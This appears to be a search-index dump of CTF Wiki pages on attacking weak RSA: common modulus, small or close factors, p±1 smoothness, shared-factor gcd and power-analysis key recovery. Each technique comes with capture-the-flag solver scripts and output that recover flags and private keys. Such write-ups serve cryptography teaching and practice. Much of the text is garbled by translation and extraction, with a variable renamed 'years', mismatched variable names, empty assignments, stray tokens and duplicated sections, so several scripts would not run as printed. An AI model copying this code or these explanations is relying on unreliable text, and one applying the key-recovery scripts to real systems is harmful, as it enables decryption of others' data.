0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929 e1 = 17 e2 = 65537 with open ( \"flag.enc1\" , \"rb\" ) as f1 , open ( \"flag.enc2\" , \"rb\" ) as f2 : c1 = bytes_to_long ( f1 . read ()) c2 = bytes_to_long ( f2 . read ()) #--------common modulus--------# r , s , gcd = gcdex ( e1 , e2 ) r = int ( r ) s = int ( s ) # test if e1 and e2 are coprime if gcd != 1 : print ( \"e1 and e2 must be coprime\" ) exit () m = ( pow ( c1 , r , N ) * pow ( c2 , s , N )) % N flag = long_to_bytes ( m ) print ( flag ) Run the script and grab your flag.","title":"Modulo-related Attacks"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#bruteforcing-factors-of-n","text":"","title":"Bruteforcing Factors of N"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-prerequisite","text":"N is efficiently small (less than 512 bits, for example).","title":"Attack Prerequisite"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#jarvisoj-easy-rsa","text":"Here we take \"JarvisOJ - Easy RSA\" as an example, the challenge description is the following: > Remember the veryeasy RSA? Is it not difficult? Then continue to look at this question, this question is not difficult. > Known piece of RSA encrypted information is: 0xdc2eeeb2782c and the public key used for encryption is known: > N = 322831561921859 and = 23 > Please decrypt the plaintext, please convert the number into ascii code submission when submitting > For example, if the plaintext you solved is 0x6162, please submit the string ab > Submit format: PCTF{clear text string} We can see that our N is small. Here we can query the factors of N manually from factordb : 322831561921859 = 13574881 \\times 23781539 322831561921859 = 13574881 \\times 23781539 But a better solution is to utilize factordb-python for factoring automation: #!/usr/bin/env python3 from Crypto.Util.number import inverse , long_to_bytes from factordb.factordb import FactorDB #--------data--------# N = 322831561921859 e = 23 c = 0xdc2eeeb2782c #--------factordb--------# f = FactorDB ( N ) f . connect () factors = f . get_factor_list () #--------rsa--------# phi = 1 for factor in factors : phi *= factor - 1 d = inverse ( e , phi ) m = pow ( c , d , N ) flag = long_to_bytes ( m ) . decode () print ( flag ) Run the script and grab your flag.","title":"JarvisOJ - Easy RSA"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-q-improper-decomposition-n","text":"","title":"p &amp; q Improper decomposition N"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-conditions","text":"We can also attack when p and q are not selected properly in RSA.","title":"Attack conditions"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#pq-very-large","text":"When pq is large, there must be a certain parameter is small, here we assume p, then we can try to divide the modulus by exhaustive method, and then decompose the modulus, get the confidential parameters and plaintext information. Basically, it is not very feasible.","title":"|pq| Very large"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#pq-smaller","text":"First of all \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} Since |pq| is small, \\frac{(pq)^2}{4} \\frac{(pq)^2}{4} is naturally small, and \\frac{(p+q)^2}{4} \\frac{(p+q)^2}{4} is only slightly larger than N. , so \\frac{p+q}{2} \\frac{p+q}{2} is similar to \\sqrt{n} \\sqrt{n} . Then we can decompose as follows Check each integer x of \\sqrt{n} \\sqrt{n} in sequence until you find an x such that x^2-n x^2-n is the square number, denoted as y^2 y^2 Then x^2-n=y^2 x^2-n=y^2 , and then decompose N according to the squared difference formula","title":"|pq| Smaller"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1-smooth","text":"When p is a factor of N and p - 1 is smooth, it is possible to use the Pollard's p \u2212 1 algorithm to decompose N, but it is not entirely successful. Warning Principle analysis to be completed","title":"p - 1 Smooth"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#p-1-smooth_1","text":"When p is a factor of n and p + 1 is smooth, it may be possible to use the Williams's p + 1 algorithm to decompose N, but it is not entirely successful.","title":"p + 1 Smooth"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#2017-seccon-very-smooth","text":"The program gives an HTTPS encrypted traffic packet, first getting the certificate from it. \u279c 2017_SECCON_verysmooth git: ( master ) binwalk -e s.pcap DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 2292 0x8F4 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 4038 0xFC6 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 5541 0x15A5 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 \u279c 2017_SECCON_verysmooth git: ( master ) ls s.pcap _s.pcap.extracted very_smooth.zip Here are three certificates, three modules are the same, only one example is given here. \u279c _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt -pubkey -text -modulus -noout -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy 8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj DUddp + 4X8C9jtvCaLTgd + baSjo2eB0f + uiSL / 9 / 4NN + vR3FliRm2mByeFCjppTQl yioxCqbXYIMxGO4NcQIDAQAB -----END PUBLIC KEY----- Certificate: Data: Version: 1 (0x0) Serial Number: 11640506567126718943 (0xa18b630c7b3099df) Signature Algorithm: sha256WithRSAEncryption Issuer: C=JP, ST=Kawasaki, O=SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C=JP, ST=Kawasaki, O=SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5: c2: 7b: 67: 03: 5a: ec: 19: 2b: 37: 41: dd: 1f: 4d: 12: 75: 31: b0: 7a: b0: 12: eb: 86: 24: 1c: 09: c0: 81: 49: 9e: 69: ef: 5a: ea: c7: 8d: c6: 23: 0d: 47: 5d: a7: ee: 17: f0: 2f: 63: b6: f0: 9a: 2d: 38: 1d: f9: b6: 92: 8e: 8d: 9e:47: fe: ba: 24: 8b: ff: df: f8: 9c: df: af: 47: 71: 65: 89: 19: b6: 98: 1: 9e: 14: 28: e9: a5: 34: 25: ca: 2a: 31: 0a: a6: d7: 60: 83: 31: 18: in: 0d: 71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78: 92: 11: fb: 6c: e1: 7a: f7: 2a: 33: b8: 8b: 08: a7: f7: 5b: de: cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf: 5b: a7: ee: 8b: 1e: 48: a7: d2: 43: 06: 0e: 4f: 5a: 86: 62: 69: e2: c0: bd: 4e: 89: c9: af: 04: 4a: 77: a2: b7: 39 Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 It can be seen that the modulus is only 1024 bits. Moreover, according to the title name very smooth, it should be one of the factors comparing smooth, here we use the primaryfac to try Pollard's p \u2212 1 and Williams's p + 1 algorithm respectively, as follows \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs -m = p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 : p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 It can be found that when using the Williams's p + 1 algorithm, it is directly decomposed. It is reasonable to say that this factor is p-1 seems to be smoother, but it cannot be decomposed using the Pollard's p \u2212 1 algorithm. Further testing is done here. \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 : 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 Z154 = P1 x P1 x P2 x P3 x P6 x P142 = 2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 : 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 Z154 = P1^185 x P1^62 x P1^97 = 2 ^185 x 3 ^62 x 5 ^97 It can be seen that there are indeed many small factors for p-1, but the number is too large, which will cause an exponential explosion when enumerating, so it is not decomposed. And construct a private key based on the decomposed number from Crypto.PublicKey import RSA import gmpy2 def main (): n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 L q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L e = 65537 L priv = RSA . construct (( n , e , long ( gmpy2 . invert ( e , ( p - 1 ) * ( q - 1 ))))) open ( 'private.pem' , 'w' ) . write ( priv . exportKey ( 'PEM' )) main () Finally, import the private key into wireshark to get the plain text (Edit -> Preferences -> Protocols -> SSL -> RSA Key List). < html > < head >< title > Very smooth </ title ></ head > < body > < h1 > Answer: One of these primes is very smooth. </ h1 > </ body > </ html >","title":"2017 SECCON very smooth"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#extension","text":"For more on some methods of decomposing the modulus N, please refer to https://en.wikipedia.org/wiki/Integer_factorization .","title":"Extension"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#non-coprime-moduli","text":"","title":"Non-coprime Moduli"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-prerequisite_1","text":"When there are two public keys, N is not mutually prime, we can obviously obtain the greatest common factor directly for these two numbers, and then directly obtain p, q, and then obtain the corresponding private key.","title":"Attack Prerequisite"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#sctf-rsa2","text":"Here we take SCTF rsa2 as an example. Open the pcap package directly and find that there are a bunch of messages, including N and e, and then try to test whether the different N is mutual. I tried the first two. import gmpy2 n1 = n2 = print gmpy2 . gcd ( n1 , n2 ) The results found that they were not mutually exclusive. \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py 122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137 Then we can decrypt it directly, here we use the first pair of public key ciphers. code show as below from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = n2 = p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 ! = 0 : plain = '0' + plain print plain . decode ( 'hex' ) Finally decrypted as follows \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py sH1R3_PRlME_1N_rsA_iS_4ulnEra5le Unzip the package.","title":"SCTF RSA2"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#common-modulus-attack","text":"","title":"Common Modulus Attack"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-prerequisite_2","text":"Same modulus N is used multiple times to encrypt the same plaintext m (only e is different for each encryption). e1 and e2 are coprime.","title":"Attack Prerequisite"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#theory","text":"Suppose the public exponents of two users are e_1 e_1 and e_2 e_2 , where e_1 e_1 and e_2 e_2 are coprime. If the plaintext m m , then the ciphertext is: c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N Attack could recover the plaintext if he/she obtained c_1 c_1 and c_2 c_2 . Compute the two coefficients r r and s s of re_1+se_2=1\\bmod n re_1+se_2=1\\bmod n using extended Euclidean Algorithm, we have: \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*}","title":"Theory"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#jarvis-oj-crypto-very-hard-rsa","text":"Check out the given source code: #!/usr/bin/env python import random N = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929 L def pad_even ( x ): return ( '' , '0' )[ len ( x ) % 2 ] + x e1 = 17 e2 = 65537 fi = open ( 'flag.txt' , 'rb' ) fo1 = open ( 'flag.enc1' , 'wb' ) fo2 = open ( 'flag.enc2' , 'wb' ) data = fi . read () fi . close () while ( len ( data ) < 512 - 11 ): data = chr ( random . randint ( 0 , 255 )) + data data_num = int ( data . encode ( 'hex' ), 16 ) encrypt1 = pow ( data_num , e1 , N ) encrypt2 = pow ( data_num , e2 , N ) fo1 . write ( pad_even ( format ( encrypt1 , 'x' )) . decode ( 'hex' )) fo2 . write ( pad_even ( format ( encrypt2 , 'x' )) . decode ( 'hex' )) fo1 . close () fo2 . close () Take a look at this part: encrypt1 = pow ( data_num , e1 , N ) encrypt2 = pow ( data_num , e2 , N ) We can see that the same modulus N is used twice, and e1 and e2 are coprime. Proceed with common modulus attack: #!/usr/bin/env python3 from Crypto.Util.number import long_to_bytes , bytes_to_long from sympy import gcdex from sys import exit #--------data--------# N = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929 e1 = 17 e2 = 65537 with open ( \"flag.enc1\" , \"rb\" ) as f1 , open ( \"flag.enc2\" , \"rb\" ) as f2 : c1 = bytes_to_long ( f1 . read ()) c2 = bytes_to_long ( f2 . read ()) #--------common modulus--------# r , s , gcd = gcdex ( e1 , e2 ) r = int ( r ) s = int ( s ) # test if e1 and e2 are coprime if gcd != 1 : print ( \"e1 and e2 must be coprime\" ) exit () m = ( pow ( c1 , r , N ) * pow ( c2 , s , N )) % N flag = long_to_bytes ( m ) print ( flag ) Run the script and grab your flag.","title":"Jarvis OJ Crypto - very hard RSA"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/","text":"Bleichenbacher's attack \u00b6 RSA signature can be forged in the PKCS 1.5 standard Warning To be added. http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html","title":"Bleichenbacher Attack"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/#bleichenbachers-attack","text":"RSA signature can be forged in the PKCS 1.5 standard Warning To be added. http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html","title":"Bleichenbacher&#39;s attack"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/","text":"RSA Side Channel Attack \u00b6 An energy analysis attack (side channel attack) is a password attack method that can obtain secret information from a cryptographic device. Instead of His attack method is different: this attack uses the energy consumption characteristics of the cryptographic device, not the mathematical characteristics of the cryptographic algorithm. An energy analysis attack is a non-intrusive attack that allows an attacker to easily purchase the equipment needed to implement an attack: this type of attack poses a serious threat to the security of cryptographic devices such as smart cards. Energy analysis attacks are a very important part of the security arena, and we will only discuss them briefly here. Energy analysis attacks are divided into: - Simple Energy Analysis Attack (SPA), which allows visual analysis of energy traces, which can be viewed with the naked eye. - Differential Energy Analysis Attack (DPA), based on correlation coefficients between energy traces. Attack conditions \u00b6 The attacker can obtain side channel information related to encryption and decryption, such as energy consumption, computing time, electromagnetic radiation, and the like. example \u00b6 Here we take the Hack in the card I of HITB 2017 as an example. The topic gives the public key file publickey.pem , ciphertext, the circuit diagram for measuring the smart card power, and the power consumption consumed by the smart card during the decryption (given [trace] via the online website ( http://47.74 .147.53:20015/index.html)). Ciphertext: 014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046 Analysis \u00b6 Since the site only gives an energy trace, it can be concluded that this is a Simple channel analysis (SPA) attack. Then we can directly obtain the key d of the RSA decryption process by observing the high and low levels of the energy trace. The theoretical basis for RSA attacks by SPA comes from the fast power remainder algorithm included in RSA. The fast power algorithm is as follows When b is even, a^b \\bmod c = ({a^2}^{b/2}) \\bmod c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c . When b is an odd number, a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c . The corresponding C code is implemented as: int PowerMod ( int a , int b , int c ) { int ans = 1 ; a = a % c ; while ( b > 0 ) { If ( b % 2 == 1 ) // When b is odd, the following instructions will be executed more years = ( years * a ) % c ; b = b / 2 ; a = ( a * a ) % c ; } return years ; } Since the value of the exponent is judged bit by bit during the calculation of the fast power, and different operations are taken, the value of d can be restored from the energy trace (from the above, the directly obtained value is the binary value of d) reverse order ). note : > Sometimes modular multiplication may also be multiplied from high to low. Here is the multiplication from the low to the high. The script that restores d can be given as follows: f = open ( './data.txt' ) data = f . read () . split ( \",\" ) print ( 'point number:' , len ( data )) Start_point = 225 # Point to start analysis Mid = 50 # sampling point interval Fence = 228 # high and low level dividing line bin_array = [] for point_index in range ( start_point , len ( data ), mid ): if float ( data [ point_index ]) > fence : bin_array . append ( 1 ) else : bin_array . append ( 0 ) bin_array2 = [] flag1 = 0 flag2 = 0 for x in bin_array : if x : if flag1 : flag2 = 1 else : flag1 = 1 else : if flag2 : bin_array2 . append ( 1 ) else : bin_array2 . append ( 0 ) flag1 = 0 flag2 = 0 # d_bin = bin_array2 [:: - 1] d_bin = bin_array2 d = \"\" . join ( str ( x ) for x in d_bin )[:: - 1 ] print ( d ) d_int = int ( d , 2 ) print ( d_int ) References \u00b6 Mangard, S., Oswald, E., Popp, T., Feng Dengguo, Zhou Yongbin, & Liu Jiye. (2010). Energy Analysis Attack.","title":"Side Channel Attack"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#rsa-side-channel-attack","text":"An energy analysis attack (side channel attack) is a password attack method that can obtain secret information from a cryptographic device. Instead of His attack method is different: this attack uses the energy consumption characteristics of the cryptographic device, not the mathematical characteristics of the cryptographic algorithm. An energy analysis attack is a non-intrusive attack that allows an attacker to easily purchase the equipment needed to implement an attack: this type of attack poses a serious threat to the security of cryptographic devices such as smart cards. Energy analysis attacks are a very important part of the security arena, and we will only discuss them briefly here. Energy analysis attacks are divided into: - Simple Energy Analysis Attack (SPA), which allows visual analysis of energy traces, which can be viewed with the naked eye. - Differential Energy Analysis Attack (DPA), based on correlation coefficients between energy traces.","title":"RSA Side Channel Attack"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#attack-conditions","text":"The attacker can obtain side channel information related to encryption and decryption, such as energy consumption, computing time, electromagnetic radiation, and the like.","title":"Attack conditions"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#example","text":"Here we take the Hack in the card I of HITB 2017 as an example. The topic gives the public key file publickey.pem , ciphertext, the circuit diagram for measuring the smart card power, and the power consumption consumed by the smart card during the decryption (given [trace] via the online website ( http://47.74 .147.53:20015/index.html)). Ciphertext: 014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046","title":"example"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#analysis","text":"Since the site only gives an energy trace, it can be concluded that this is a Simple channel analysis (SPA) attack. Then we can directly obtain the key d of the RSA decryption process by observing the high and low levels of the energy trace. The theoretical basis for RSA attacks by SPA comes from the fast power remainder algorithm included in RSA. The fast power algorithm is as follows When b is even, a^b \\bmod c = ({a^2}^{b/2}) \\bmod c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c . When b is an odd number, a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c . The corresponding C code is implemented as: int PowerMod ( int a , int b , int c ) { int ans = 1 ; a = a % c ; while ( b > 0 ) { If ( b % 2 == 1 ) // When b is odd, the following instructions will be executed more years = ( years * a ) % c ; b = b / 2 ; a = ( a * a ) % c ; } return years ; } Since the value of the exponent is judged bit by bit during the calculation of the fast power, and different operations are taken, the value of d can be restored from the energy trace (from the above, the directly obtained value is the binary value of d) reverse order ). note : > Sometimes modular multiplication may also be multiplied from high to low. Here is the multiplication from the low to the high. The script that restores d can be given as follows: f = open ( './data.txt' ) data = f . read () . split ( \",\" ) print ( 'point number:' , len ( data )) Start_point = 225 # Point to start analysis Mid = 50 # sampling point interval Fence = 228 # high and low level dividing line bin_array = [] for point_index in range ( start_point , len ( data ), mid ): if float ( data [ point_index ]) > fence : bin_array . append ( 1 ) else : bin_array . append ( 0 ) bin_array2 = [] flag1 = 0 flag2 = 0 for x in bin_array : if x : if flag1 : flag2 = 1 else : flag1 = 1 else : if flag2 : bin_array2 . append ( 1 ) else : bin_array2 . append ( 0 ) flag1 = 0 flag2 = 0 # d_bin = bin_array2 [:: - 1] d_bin = bin_array2 d = \"\" . join ( str ( x ) for x in d_bin )[:: - 1 ] print ( d ) d_int = int ( d , 2 ) print ( d_int )","title":"Analysis"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#references","text":"Mangard, S., Oswald, E., Popp, T., Feng Dengguo, Zhou Yongbin, & Liu Jiye. (2010). Energy Analysis 